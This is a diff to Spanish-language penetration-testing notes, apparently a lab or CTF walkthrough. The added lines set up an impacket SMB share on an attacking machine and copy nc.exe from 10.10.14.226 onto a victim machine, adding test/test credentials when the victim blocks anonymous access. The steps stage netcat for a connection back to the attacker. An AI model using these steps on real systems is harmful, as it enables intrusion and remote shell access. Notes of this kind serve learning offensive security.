@@ -175,8 +175,19 @@ Este archivito se encarga de a través de [[NETCAT]] entablar una conexión con 
 El archivo lo crearemos en nuestra maquina atacante y lo subiremos a la maquina victima junto con el [[NETCAT]]
 
 En nuestra maquina atacante nos pondremos como *root* y usaremos [[SMBSERVER]] de [[IMPACKET]] 
+```shell
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
 
+Y en la maquina victima
+```shell
+copy \\10.10.14.226\smbFolder\nc.exe nc.exe 
+```
 
+Nos dará un error que nos indica que no se nos permite importar archivos sin unas credenciales como medida de seguridad así que implementaremos un usuario y una contraseña al [[SMBSERVER]]
+```shell
+impacket-smbserver smbFolder $(pwd) -smb2support -username test -password test
+```
 
 
 
